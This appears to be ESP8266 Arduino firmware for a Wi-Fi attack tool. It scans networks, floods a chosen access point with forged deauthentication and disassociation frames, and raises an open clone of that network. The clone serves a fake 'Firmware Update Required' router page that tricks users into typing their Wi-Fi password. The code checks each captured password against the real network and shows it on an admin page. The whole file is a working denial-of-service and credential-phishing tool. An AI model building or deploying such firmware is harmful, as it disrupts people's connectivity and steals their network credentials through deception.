#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

extern "C" {
#include "user_interface.h"
}


typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;

// --- forward declarations (required for .cpp, Arduino IDE does this for .ino) ---
void handleIndex();
void handleResult();
void handleAdmin();
String bytesToStr(const uint8_t* b, uint32_t size);
// -------------------------------------------------------------------------------

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

String _correct = "";
String _tryPassword = "";

void setup() {

  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("M1z23R", "deauther");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
    Serial.println("Wrong password tried !");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("M1z23R", "deauther");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}


String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("M1z23R", "deauther");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html",
        "<!DOCTYPE html><html><head><meta charset='utf-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1.0'>"
        "<title>Updating Firmware...</title>"
        "<style>"
        "*{box-sizing:border-box;margin:0;padding:0}"
        "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;"
        "background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);"
        "min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;color:#e0e0e0}"
        ".card{background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);"
        "border:1px solid rgba(255,255,255,0.1);border-radius:20px;padding:40px 30px;"
        "max-width:420px;width:100%;text-align:center;"
        "box-shadow:0 20px 60px rgba(0,0,0,0.5)}"
        ".icon{width:64px;height:64px;margin:0 auto 24px;"
        "border:3px solid rgba(0,200,255,0.2);border-top-color:#00c8ff;"
        "border-radius:50%;animation:spin 1s linear infinite}"
        "@keyframes spin{to{transform:rotate(360deg)}}"
        "h1{font-size:22px;font-weight:600;margin-bottom:12px;color:#fff}"
        "p{font-size:14px;line-height:1.6;color:#a0a8b8;margin-bottom:24px}"
        ".progress{height:6px;background:rgba(255,255,255,0.08);border-radius:3px;overflow:hidden;margin-bottom:20px}"
        ".bar{height:100%;width:0%;background:linear-gradient(90deg,#00c8ff,#00ffa3);"
        "border-radius:3px;animation:fill 15s ease-out forwards}"
        "@keyframes fill{to{width:100%}}"
        ".note{font-size:12px;color:#6b7280;margin-top:16px}"
        "</style></head><body>"
        "<div class='card'>"
        "<div class='icon'></div>"
        "<h1>Installing Firmware Update</h1>"
        "<p>Your router is applying the latest security update. Please do not power off or close this window.</p>"
        "<div class='progress'><div class='bar'></div></div>"
        "<div class='note'>This may take up to 15 seconds...</div>"
        "</div>"
        "<script>setTimeout(function(){window.location.href='/result';},15000);</script>"
        "</body></html>");
    } else {
      webServer.send(200, "text/html",
        "<!DOCTYPE html><html><head><meta charset='utf-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1.0'>"
        "<title>Router Login</title>"
        "<style>"
        "*{box-sizing:border-box;margin:0;padding:0}"
        "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;"
        "background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);"
        "min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;color:#e0e0e0}"
        ".card{background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);"
        "border:1px solid rgba(255,255,255,0.1);border-radius:20px;padding:40px 30px;"
        "max-width:420px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.5)}"
        ".logo{width:56px;height:56px;margin:0 auto 20px;background:linear-gradient(135deg,#00c8ff,#00ffa3);"
        "border-radius:14px;display:flex;align-items:center;justify-content:center;"
        "font-size:28px;font-weight:700;color:#0a0e1a}"
        "h1{font-size:20px;font-weight:600;text-align:center;margin-bottom:8px;color:#fff}"
        "p.sub{font-size:13px;text-align:center;color:#a0a8b8;margin-bottom:28px;line-height:1.5}"
        "label{display:block;font-size:12px;font-weight:500;color:#a0a8b8;"
        "text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px}"
        "input[type=password]{width:100%;padding:14px 16px;background:rgba(0,0,0,0.3);"
        "border:1px solid rgba(255,255,255,0.1);border-radius:12px;color:#fff;"
        "font-size:15px;outline:none;transition:border-color 0.2s,box-shadow 0.2s}"
        "input[type=password]:focus{border-color:#00c8ff;box-shadow:0 0 0 3px rgba(0,200,255,0.15)}"
        "input[type=submit]{width:100%;padding:14px;margin-top:20px;"
        "background:linear-gradient(135deg,#00c8ff,#00ffa3);border:none;border-radius:12px;"
        "color:#0a0e1a;font-size:15px;font-weight:600;cursor:pointer;"
        "transition:transform 0.15s,box-shadow 0.2s}"
        "input[type=submit]:hover{transform:translateY(-1px);box-shadow:0 8px 24px rgba(0,200,255,0.3)}"
        "input[type=submit]:active{transform:translateY(0)}"
        ".foot{text-align:center;font-size:11px;color:#6b7280;margin-top:24px}"
        "</style></head><body>"
        "<div class='card'>"
        "<div class='logo'>W</div>"
        "<h1>Firmware Update Required</h1>"
        "<p class='sub'>Router <strong style='color:#00c8ff'>" + _selectedNetwork.ssid + "</strong> needs a security update to continue.</p>"
        "<form action='/' method='get'>"
        "<label for='password'>Wi-Fi Password</label>"
        "<input type='password' id='password' name='password' "
        "placeholder='Enter your Wi-Fi password' minlength='8' required autofocus>"
        "<input type='submit' value='Install Update'>"
        "</form>"
        "<div class='foot'>Secured connection &middot; Firmware v2.4.1</div>"
        "</div>"
        "</body></html>");
    }
  }

}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("M1z23R", "deauther");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}